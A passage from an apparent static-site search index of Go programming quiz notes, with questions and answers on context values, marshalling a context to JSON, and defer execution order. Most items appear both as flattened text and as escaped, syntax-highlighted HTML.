\u0026#34;b\u0026#34;)) fmt.Println(string(data)) } Answer Try it {\"Context\":{}} ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/go/questions/context/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003econtext\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;context\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ectx\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003econtext\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eContext\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003econtext\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWithValue\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ectx\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;foo\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ectx\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003econtext\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eTODO\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ectx\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ectx\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eValue\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;foo\u0026#34;\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA. -6\u003c/li\u003e\n\u003cli\u003eB. 0\u003c/li\u003e\n\u003cli\u003eC. \u003ccode\u003e\u0026lt;nil\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eD: panic\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/NY8BWaciqad\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eC\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003econtext1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e(\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;encoding/json\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;context\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eMarshal\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003econtext\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWithValue\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003econtext\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eBackground\u003c/span\u003e(), \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;a\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;b\u0026#34;\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(string(\u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/CWdDXkvRExT\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e{\"Context\":{}}\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Context"},{"categories":null,"contents":" defer package main import ( \u0026#34;fmt\u0026#34; ) func main() { defer_call() } func defer_call() { defer func() { fmt.Println(\u0026#34;1\u0026#34;) }() defer func() { fmt.Println(\u0026#34;2\u0026#34;) }() defer func() { fmt.Println(\u0026#34;3\u0026#34;) }() panic(\u0026#34;4\u0026#34;) } Answer Try it 3 2 1 panic: 4 defer1 package main import ( \u0026#34;fmt\u0026#34; ) type Person struct { age int } func main() { person := \u0026amp;Person{28} defer fmt.Println(person.age) defer func(p *Person) { fmt.Println(p.age) }(person) defer func() { fmt.Println(person.age) }() person.age = 29 } Answer Try it 29 29 28 defer2 package main import ( \u0026#34;fmt\u0026#34; ) type Person struct { age int } func main() { person := \u0026amp;Person{28} defer fmt.Println(person.age) defer func(p *Person) { fmt.Println(p.age) }(person) defer func() { fmt.Println(person.age) }() person = \u0026amp;Person{29} } Answer Try it 29 28 28 defer3 package main import ( \u0026#34;fmt\u0026#34; ) var a bool = true func main() { defer func() { fmt.Println(\u0026#34;1\u0026#34;) }() if a == true { fmt.Println(\u0026#34;2\u0026#34;) return } defer func() { fmt.Println(\u0026#34;3\u0026#34;) }() } Answer Try it 2 1 defer4 package main import \u0026#34;fmt\u0026#34; type temp struct{} func (t *temp) Add(elem int) *temp { fmt.Print(elem) return \u0026amp;temp{} } func main() { tt := \u0026amp;temp{} defer tt.Add(1).Add(2) tt.Add(3) } A. 132 B. 123 C. 312 D. 321 Answer Try it A ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/go/questions/defer/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003edefer\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003edefer_call\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edefer_call\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() { \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e) }()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() { \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;2\u0026#34;\u003c/span\u003e) }()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() { \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;3\u0026#34;\u003c/span\u003e) }()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    panic(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;4\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/-bTDzXAjgYn\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e3\n2\n1\npanic: 4\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003edefer1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePerson\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eage\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eperson\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ePerson\u003c/span\u003e{\u003cspan style=\"color:#ae81ff\"\u003e28\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eperson\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eage\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ep\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ePerson\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ep\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eage\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}(\u003cspan style=\"color:#a6e22e\"\u003eperson\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eperson\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eage\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eperson\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eage\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e29\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/JChQfww_8GK\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e29\n29\n28\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003edefer2\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePerson\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eage\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eperson\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ePerson\u003c/span\u003e{\u003cspan style=\"color:#ae81ff\"\u003e28\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eperson\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eage\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ep\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ePerson\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ep\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eage\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}(\u003cspan style=\"color:#a6e22e\"\u003eperson\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eperson\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eage\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eperson\u003c/span\u003e = \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ePerson\u003c/span\u003e{\u003cspan style=\"color:#ae81ff\"\u003e29\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/blqcBt9nVrk\" 